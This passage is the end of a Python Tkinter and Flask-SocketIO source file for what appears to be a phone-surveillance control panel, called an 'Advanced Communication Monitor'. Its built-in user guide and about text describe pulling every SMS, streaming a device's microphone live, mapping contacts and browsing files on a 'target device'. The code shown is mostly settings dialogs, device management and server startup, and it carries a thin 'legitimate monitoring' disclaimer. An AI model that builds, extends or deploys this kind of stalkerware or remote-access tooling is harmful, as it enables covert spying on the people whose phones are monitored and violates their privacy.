        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # General settings tab
        general_tab = ttk.Frame(notebook, style="Themed.TFrame")
        notebook.add(general_tab, text="General")

        # Theme setting
        theme_frame = tk.LabelFrame(
            general_tab,
            text="Appearance",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
        )
        theme_frame.pack(fill=tk.X, padx=10, pady=10)

        theme_var = tk.StringVar(value=theme_manager.current_theme)
        tk.Radiobutton(
            theme_frame,
            text="🌞 Light Mode",
            variable=theme_var,
            value="light",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            selectcolor=self.current_theme["entry_bg"],
        ).pack(anchor="w", padx=10, pady=5)
        tk.Radiobutton(
            theme_frame,
            text="🌙 Dark Mode",
            variable=theme_var,
            value="dark",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            selectcolor=self.current_theme["entry_bg"],
        ).pack(anchor="w", padx=10, pady=5)

        # System settings
        system_frame = tk.LabelFrame(
            general_tab,
            text="System Behavior",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
        )
        system_frame.pack(fill=tk.X, padx=10, pady=10)

        auto_refresh_var = tk.BooleanVar(
            value=settings_manager.get("auto_refresh", True)
        )
        tk.Checkbutton(
            system_frame,
            text="Auto refresh data",
            variable=auto_refresh_var,
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            selectcolor=self.current_theme["entry_bg"],
        ).pack(anchor="w", padx=10, pady=5)

        sound_alerts_var = tk.BooleanVar(
            value=settings_manager.get("sound_alerts", True)
        )
        tk.Checkbutton(
            system_frame,
            text="Sound alerts",
            variable=sound_alerts_var,
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            selectcolor=self.current_theme["entry_bg"],
        ).pack(anchor="w", padx=10, pady=5)

        # Performance settings tab
        performance_tab = ttk.Frame(notebook, style="Themed.TFrame")
        notebook.add(performance_tab, text="Performance")

        optimization_frame = tk.LabelFrame(
            performance_tab,
            text="Optimization",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
        )
        optimization_frame.pack(fill=tk.X, padx=10, pady=10)

        battery_var = tk.BooleanVar(
            value=settings_manager.get("battery_monitoring", True)
        )
        tk.Checkbutton(
            optimization_frame,
            text="Battery monitoring",
            variable=battery_var,
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            selectcolor=self.current_theme["entry_bg"],
        ).pack(anchor="w", padx=10, pady=5)

        network_var = tk.BooleanVar(
            value=settings_manager.get("network_optimization", True)
        )
        tk.Checkbutton(
            optimization_frame,
            text="Network optimization",
            variable=network_var,
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            selectcolor=self.current_theme["entry_bg"],
        ).pack(anchor="w", padx=10, pady=5)

        compression_var = tk.BooleanVar(
            value=settings_manager.get("compression_enabled", True)
        )
        tk.Checkbutton(
            optimization_frame,
            text="Data compression",
            variable=compression_var,
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            selectcolor=self.current_theme["entry_bg"],
        ).pack(anchor="w", padx=10, pady=5)

        # Max file display setting
        display_frame = tk.LabelFrame(
            performance_tab,
            text="Display Limits",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
        )
        display_frame.pack(fill=tk.X, padx=10, pady=10)

        tk.Label(
            display_frame,
            text="Max files to display:",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
        ).pack(anchor="w", padx=10, pady=5)
        max_files_var = tk.IntVar(value=settings_manager.get("max_file_display", 100))
        max_files_entry = tk.Entry(
            display_frame,
            textvariable=max_files_var,
            bg=self.current_theme["entry_bg"],
            fg=self.current_theme["entry_fg"],
        )
        max_files_entry.pack(anchor="w", padx=10, pady=5, fill=tk.X)

        # Buttons
        button_frame = tk.Frame(settings_window, bg=self.current_theme["bg"])
        button_frame.pack(fill=tk.X, padx=10, pady=10)

        def save_settings():
            # Save all settings
            settings_manager.set("theme", theme_var.get())
            settings_manager.set("auto_refresh", auto_refresh_var.get())
            settings_manager.set("sound_alerts", sound_alerts_var.get())
            settings_manager.set("battery_monitoring", battery_var.get())
            settings_manager.set("network_optimization", network_var.get())
            settings_manager.set("compression_enabled", compression_var.get())
            settings_manager.set("max_file_display", max_files_var.get())

            # Apply theme change
            if theme_var.get() != theme_manager.current_theme:
                theme_manager.current_theme = theme_var.get()
                self._apply_theme()

            self.add_system_log("⚙️ Settings saved successfully", "success")
            settings_window.destroy()

        def reset_settings():
            confirm = messagebox.askyesno(
                "Reset Settings",
                "Are you sure you want to reset all settings to defaults?",
                parent=settings_window,
            )
            if confirm:
                # Reset to defaults
                theme_var.set("light")
                auto_refresh_var.set(True)
                sound_alerts_var.set(True)
                battery_var.set(True)
                network_var.set(True)
                compression_var.set(True)
                max_files_var.set(100)

        tk.Button(
            button_frame,
            text="💾 Save",
            command=save_settings,
            bg=self.current_theme["status_success"],
            fg="#ffffff",
        ).pack(side=tk.LEFT, padx=5)
        tk.Button(
            button_frame,
            text="🔄 Reset",
            command=reset_settings,
            bg=self.current_theme["status_warning"],
            fg="#ffffff",
        ).pack(side=tk.LEFT, padx=5)
        tk.Button(
            button_frame,
            text="❌ Cancel",
            command=settings_window.destroy,
            bg=self.current_theme["button_bg"],
            fg=self.current_theme["button_fg"],
        ).pack(side=tk.RIGHT, padx=5)

    def _show_user_guide(self):
        """عرض دليل المستخدم"""
        guide_text = """
📖 ADVANCED COMMUNICATION MONITOR - USER GUIDE
{'='*70}

🚀 GETTING STARTED
1. Connect your monitoring device to the same network
2. Launch the monitoring app on the target device
3. Wait for the device to appear in "Live Monitors"
4. Select the device and start issuing commands

💬 ENHANCED SMS EXTRACTION
• Standard SMS Extract: Extract recent messages with optimization
• Unlimited SMS + Compression: Extract ALL messages with intelligent compression
• Both methods preserve message integrity while optimizing transfer

👥 SOCIAL NETWORK ANALYSIS
• Comprehensive contact analysis
• Communication pattern recognition
• Network relationship mapping

🎵 AUDIO MONITORING
• Fixed Duration Recording: Record for a specified time
• Live Audio Stream: Real-time audio monitoring with playback

📁 FILE OPERATIONS
• File Browser: Navigate device file system
• Library Catalog: Intelligent file organization
• Content Analysis: Analyze specific files

🌙 DARK MODE
• Toggle between light and dark themes
• Automatic UI color adaptation
• Settings are saved automatically

⚙️ SMART FEATURES
• Battery-aware processing
• Network optimization
• Intelligent sync queues
• Resource monitoring

🔧 TROUBLESHOOTING
• Check network connectivity
• Verify device permissions
• Review system logs
• Restart both applications if needed
        """

        guide_window = tk.Toplevel(self.master)
        guide_window.title("📖 User Guide")
        guide_window.geometry("800x700")
        guide_window.configure(bg=self.current_theme["bg"])

        guide_display = scrolledtext.ScrolledText(
            guide_window,
            wrap=tk.WORD,
            bg=self.current_theme["text_bg"],
            fg=self.current_theme["text_fg"],
            font=("Consolas", 10),
        )
        guide_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        guide_display.insert(tk.END, guide_text)
        guide_display.config(state=tk.DISABLED)

    def _show_troubleshooting(self):
        """عرض دليل استكشاف الأخطاء"""
        troubleshooting_text = """
🔧 TROUBLESHOOTING GUIDE
{'='*50}

❌ COMMON ISSUES & SOLUTIONS

🔌 CONNECTION PROBLEMS
Problem: Device not appearing in Live Monitors
Solutions:
• Ensure both devices are on the same network
• Check firewall settings (port 5000)
• Restart the monitoring app on the device
• Verify server is running (check status bar)

🎵 AUDIO ISSUES
Problem: Live audio not working
Solutions:
• Check if sounddevice library is installed
• Verify microphone permissions on device
• Test with different audio devices
• Check system audio settings

💬 SMS EXTRACTION ISSUES
Problem: SMS extraction fails or returns no data
Solutions:
• Verify SMS permissions on device
• Try standard extraction before unlimited
• Check device storage space
• Ensure network stability

📁 FILE BROWSER ISSUES
Problem: Cannot access files or directories
Solutions:
• Check storage permissions on device
• Verify path exists and is readable
• Try different directory paths
• Restart the monitoring application

🌙 THEME ISSUES
Problem: Theme not applying correctly
Solutions:
• Restart the application
• Check settings file permissions
• Reset to default theme
• Clear application cache

⚡ PERFORMANCE ISSUES
Problem: Slow response or timeouts
Solutions:
• Enable network optimization
• Use compression for large data
• Check battery optimization settings
• Reduce concurrent operations

📊 DATA ISSUES
Problem: Missing or corrupted data
Solutions:
• Verify device permissions
• Check available storage space
• Retry the operation
• Contact support with log files

🔄 GENERAL TROUBLESHOOTING STEPS
1. Check system logs for error messages
2. Verify all permissions are granted
3. Restart both applications
4. Check network connectivity
5. Update to latest version
6. Clear application data if necessary

💡 TIPS FOR BETTER PERFORMANCE
• Use WiFi for better speed
• Keep devices charged during operations
• Close unnecessary applications
• Enable compression for large transfers
• Monitor system resources
        """

        troubleshooting_window = tk.Toplevel(self.master)
        troubleshooting_window.title("🔧 Troubleshooting")
        troubleshooting_window.geometry("800x700")
        troubleshooting_window.configure(bg=self.current_theme["bg"])

        troubleshooting_display = scrolledtext.ScrolledText(
            troubleshooting_window,
            wrap=tk.WORD,
            bg=self.current_theme["text_bg"],
            fg=self.current_theme["text_fg"],
            font=("Consolas", 10),
        )
        troubleshooting_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        troubleshooting_display.insert(tk.END, troubleshooting_text)
        troubleshooting_display.config(state=tk.DISABLED)

    def _show_about(self):
        """عرض معلومات البرنامج المحسنة"""
        about_text = """
🚀 ADVANCED COMMUNICATION MONITOR CONTROL PANEL
Version 2.0 Enhanced Edition

Developed for professional monitoring and analysis with cutting-edge features
and enhanced security protocols for comprehensive device management.

🌟 ENHANCED FEATURES:
• Real-time device monitoring with multi-protocol support
• Advanced social network analysis with pattern recognition
• Enhanced SMS extraction with unlimited compression
• Intelligent communication history tracking
• Smart resource monitoring and battery optimization
• Live audio streaming with high-quality playback
• Comprehensive file browsing with intelligent cataloging
• Dark mode support with dynamic theme switching
• Multi-device management with advanced tagging
• Intelligent sync queues with priority handling

⚡ TECHNICAL STACK:
• Python Flask & SocketIO for real-time communication
• Enhanced Tkinter GUI with modern theming
• Advanced data compression algorithms
• Multi-threaded audio processing
• Intelligent resource management
• JSON-based data exchange with optimization
• Smart caching and performance optimization

🔒 SECURITY FEATURES:
• Encrypted communication channels
• Permission-based access control
• Data sanitization and validation
• Secure file transfer protocols
• Privacy-focused data handling

🤖 INTELLIGENT FEATURES:
• Battery-aware processing
• Network-optimized transfers
• Smart content classification
• Automated resource monitoring
• Adaptive compression algorithms
• Intelligent error handling

📊 ANALYTICS CAPABILITIES:
• Comprehensive device statistics
• Communication pattern analysis
• Performance monitoring
• Usage analytics
• Trend analysis and reporting

🌍 PLATFORM SUPPORT:
• Cross-platform compatibility
• Android device integration
• Multi-network support
• Cloud synchronization ready

© 2024 - Advanced Monitoring Solutions
Enhanced Edition with Professional Features

⚠️ DISCLAIMER:
This software is designed for legitimate monitoring purposes only.
Users are responsible for complying with all applicable laws and regulations.
Unauthorized use of this software may violate privacy laws.
        """

        about_window = tk.Toplevel(self.master)
        about_window.title("ℹ️ About")
        about_window.geometry("700x600")
        about_window.configure(bg=self.current_theme["bg"])

        about_display = scrolledtext.ScrolledText(
            about_window,
            wrap=tk.WORD,
            bg=self.current_theme["text_bg"],
            fg=self.current_theme["text_fg"],
            font=("Arial", 11),
        )
        about_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        about_display.insert(tk.END, about_text)
        about_display.config(state=tk.DISABLED)

    def _tag_device(self):
        """وضع علامة على الجهاز"""
        if not self.current_selected_historical_device_id:
            messagebox.showerror(
                "Error", "Please select a device first.", parent=self.master
            )
            return

        current_tag = device_manager.get_tag(self.current_selected_historical_device_id)
        new_tag = simpledialog.askstring(
            "Tag Device",
            f"Enter tag for device '{self.current_selected_historical_device_id}':",
            initialvalue=current_tag,
            parent=self.master,
        )
        if new_tag is not None:
            device_manager.set_tag(self.current_selected_historical_device_id, new_tag)
            self.refresh_historical_device_list()
            self.add_system_log(
                f"🏷️ Tagged device {self.current_selected_historical_device_id}: {new_tag}",
                "success",
            )

    def _delete_device_data(self):
        """حذف بيانات الجهاز"""
        if not self.current_selected_historical_device_id:
            messagebox.showerror(
                "Error", "Please select a device first.", parent=self.master
            )
            return

        confirm = messagebox.askyesno(
            "Confirm Delete",
            f"⚠️ WARNING ⚠️\n\nAre you sure you want to delete all data for device:\n'{self.current_selected_historical_device_id}'?\n\nThis will permanently remove:\n• All SMS extractions\n• All audio recordings\n• All analysis results\n• All device statistics\n\nThis action cannot be undone!",
            parent=self.master,
        )
        if confirm:
            try:
                import shutil

                device_folder = os.path.join(
                    AppConfig.DATA_RECEIVED_DIR,
                    self.current_selected_historical_device_id,
                )
                if os.path.exists(device_folder):
                    shutil.rmtree(device_folder)

                device_manager.set_tag(self.current_selected_historical_device_id, "")
                device_manager.device_stats.pop(
                    self.current_selected_historical_device_id, None
                )
                device_manager.save_device_tags()

                self.refresh_historical_device_list()
                self.add_system_log(
                    f"🗑️ Deleted all data for device {self.current_selected_historical_device_id}",
                    "warning",
                )

                # Clear selection and details
                self.current_selected_historical_device_id = None
                self.details_text.config(state=tk.NORMAL)
                self.details_text.delete("1.0", tk.END)
                self.details_text.insert(
                    tk.END,
                    "Device data deleted. Select another device to view details.",
                )
                self.details_text.config(state=tk.DISABLED)

                self.stats_text.config(state=tk.NORMAL)
                self.stats_text.delete("1.0", tk.END)
                self.stats_text.insert(tk.END, "No device selected.")
                self.stats_text.config(state=tk.DISABLED)

                messagebox.showinfo(
                    "Delete Complete",
                    "Device data has been deleted successfully.",
                    parent=self.master,
                )

            except Exception as e:
                self.add_system_log(f"❌ Delete failed: {e}", "error")
                messagebox.showerror(
                    "Error", f"Failed to delete device data: {e}", parent=self.master
                )

    def _on_closing(self):
        """معالج إغلاق التطبيق"""
        # Save current window geometry
        current_geometry = self.master.geometry()
        settings_manager.set("window_geometry", current_geometry)

        # Save device data
        device_manager.save_device_tags()

        # Log shutdown
        self.add_system_log("🔴 Application shutting down...", "warning")

        # Close the application
        self.master.destroy()


# --- Main Execution Block ---
if __name__ == "__main__":
    try:
        # Set up logging for the main application
        main_logger = logging.getLogger("MainApp")

        # Start Flask-SocketIO server in separate thread
        flask_thread = threading.Thread(
            target=lambda: socketio.run(
                app,
                host="0.0.0.0",
                port=5000,
                use_reloader=False,
                debug=False,
                allow_unsafe_werkzeug=True,
            ),
            daemon=True,
        )
        flask_thread.start()
        logger.info("🚀 Enhanced Flask-SocketIO server starting on port 5000...")

        # Create and run the enhanced GUI application
        root = tk.Tk()

        # Set initial theme
        initial_theme = settings_manager.get("theme", "light")
        theme_manager.current_theme = initial_theme

        # Apply window icon if available
        try:
            # You can add an icon file here
            # root.iconbitmap("icon.ico")
            pass
        except:
            pass

        gui_app = AdvancedControlPanelApp(root)

        # Set up periodic refresh if enabled
        def auto_refresh():
            if settings_manager.get("auto_refresh", True):
                try:
                    gui_app.update_live_clients_list()
                    if (
                        hasattr(gui_app, "current_selected_historical_device_id")
                        and gui_app.current_selected_historical_device_id
                    ):
                        gui_app.refresh_historical_device_list()
                except Exception as e:
                    logger.warning(f"Auto refresh error: {e}")

            # Schedule next refresh
            root.after(30000, auto_refresh)  # Every 30 seconds

        # Start auto refresh
        root.after(5000, auto_refresh)  # First refresh after 5 seconds

        # Set up periodic device monitoring if enabled
        def monitor_devices():
            """Monitor device connections and perform health checks"""
            try:
                # Check for stale connections
                current_time = datetime.datetime.now()
                stale_devices = []

                for sid, device_info in list(connected_clients_sio.items()):
                    last_seen_iso = device_info.get("last_seen")
                    if last_seen_iso:
                        try:
                            last_seen_dt = datetime.datetime.fromisoformat(
                                last_seen_iso
                            )
                            time_since_last_seen = (
                                current_time - last_seen_dt
                            ).total_seconds()

                            # Mark as stale if no heartbeat for 5 minutes
                            if time_since_last_seen > 300:
                                stale_devices.append(
                                    (sid, device_info, time_since_last_seen)
                                )
                        except:
                            pass

                # Handle stale devices
                for sid, device_info, stale_time in stale_devices:
                    device_id = device_info.get("id", "Unknown")
                    gui_app.add_system_log(
                        f"⚠️ Device {device_id} appears stale (last seen {stale_time:.0f}s ago)",
                        "warning",
                    )

                    # If device is actively streaming, show warning
                    if stream_active_for_device.get(sid, False):
                        gui_app.add_system_log(
                            f"🔴 Live audio may be affected for {device_id}", "warning"
                        )

                # Update live clients list if there are changes
                if stale_devices and hasattr(gui_app, "update_live_clients_list"):
                    gui_app.update_live_clients_list()

            except Exception as e:
                logger.warning(f"Error in device monitoring: {e}")

            # Schedule next monitoring check
            root.after(60000, monitor_devices)  # Every minute

        # Start device monitoring
        root.after(60000, monitor_devices)  # First check after 1 minute

        # Set up exception handler for unexpected errors
        def handle_exception(exc_type, exc_value, exc_traceback):
            """Global exception handler"""
            if issubclass(exc_type, KeyboardInterrupt):
                sys.__excepthook__(exc_type, exc_value, exc_traceback)
                return

            logger.error(
                "Uncaught exception:", exc_info=(exc_type, exc_value, exc_traceback)
            )

            if gui_app and gui_app.master.winfo_exists():
                gui_app.add_system_log(f"💥 Unexpected error: {exc_value}", "error")

                # Show error dialog for critical errors
                error_msg = str(exc_value)
                if len(error_msg) > 200:
                    error_msg = error_msg[:200] + "..."

                messagebox.showerror(
                    "Unexpected Error",
                    f"An unexpected error occurred:\n\n{error_msg}\n\n"
                    f"The application will continue running, but some features may not work correctly.\n"
                    f"Please check the system log for more details.",
                    parent=gui_app.master,
                )

        # Install global exception handler
        sys.excepthook = handle_exception

        # Run the GUI main loop
        logger.info("🖥️ Starting Enhanced GUI application...")
        gui_app.add_system_log(
            "🚀 Advanced Communication Monitor Control Panel v2.0 Enhanced - Ready for operations"
        )
        root.mainloop()

        # Cleanup and exit
        logger.info("📝 GUI closed. Saving settings and performing cleanup...")
        device_manager.save_device_tags()
        settings_manager.save_settings()

    except KeyboardInterrupt:
        logger.info("⏹️ Application interrupted by user")
        if "gui_app" in locals():
            gui_app.add_system_log("⏹️ Application interrupted by user", "warning")
    except Exception as e:
        logger.error(f"💥 Fatal error: {e}", exc_info=True)
        if "gui_app" in locals() and gui_app.master.winfo_exists():
            messagebox.showerror(
                "Fatal Error",
                f"Application encountered a fatal error:\n\n{e}\n\nCheck the logs for more details.",
            )
    finally:
        logger.info("🔚 Application shutdown complete")
        sys.exit(0)
